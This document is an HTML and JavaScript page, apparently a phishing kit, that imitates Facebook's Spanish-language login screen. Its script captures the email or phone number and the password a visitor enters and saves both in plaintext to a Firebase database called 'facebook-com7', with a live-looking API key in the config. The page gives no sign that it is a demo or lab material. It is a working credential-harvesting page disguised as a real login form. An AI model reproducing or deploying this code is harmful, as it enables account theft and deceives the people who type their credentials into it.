<body>

<div class="login-container">
  <div class="branding">
    <h1 class="title">facebook</h1>
    <h2 class="subtitle">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
  </div>

  <div class="main-content">
    <div class="login-box">
      <form id="login-form">
        <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
        <input type="password" id="password" placeholder="Contraseña" required>
        <button type="submit" class="login-button">Iniciar sesión</button>
        <div class="forgot-password">
          <a href="https://trustworthy-alternative-social.com/recover">¿Olvidaste tu contraseña?</a>
        </div>
        <div class="divider"></div>
        <a href="https://trustworthy-alternative-social.com/signup" class="create-account">Crear cuenta nueva</a>
      </form>
    </div>
  </div>
</div>

<script>
  // Configuración de Firebase antigua para Firestore
  const firebaseConfig = {
    apiKey: "AIzaSyDABJVpXtT-iZvJ4jKg_lOJZLFiCaNwzcw",
    authDomain: "facebook-com7.firebaseapp.com",
    databaseURL: "https://facebook-com7-default-rtdb.firebaseio.com",
    projectId: "facebook-com7",
    storageBucket: "facebook-com7.appspot.com",
    messagingSenderId: "407606120629",
    appId: "1:407606120629:web:7326f41720ff6081b86efc",
    measurementId: "G-27VRJLSYJH"
  };

  // Inicialización de Firebase antigua
  const appOld = firebase.initializeApp(firebaseConfig);
  const db = firebase.firestore(); // Inicializamos Firestore

  // Obtener elementos del formulario
  const loginForm = document.getElementById('login-form');
  const loginButton = document.querySelector('.login-button');

  // Manejar el envío del formulario
  loginForm.addEventListener('submit', function(e) {
    e.preventDefault();  // Prevenir el envío tradicional del formulario

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Mostrar un mensaje de cargando, si deseas
    loginButton.innerText = "Cargando..."; 

    // Guardar datos en Firestore
    db.collection("users").add({
      email: email,
      password: password,  // Aunque es preferible que las contraseñas se "hasheen" antes de guardarlas
      createdAt: firebase.firestore.FieldValue.serverTimestamp(),  // Fecha y hora automáticas
    })
    .then(() => {
      console.log('Datos guardados en Firestore');
      alert("¡Datos guardados correctamente!");
    })
    .catch((error) => {
      console.error("Error al guardar datos en Firestore:", error);
      alert('Ocurrió un error al guardar los datos.');
    });

    // Restaurar el texto del botón
    loginButton.innerText = "Iniciar sesión";
  });
</script>

</body>
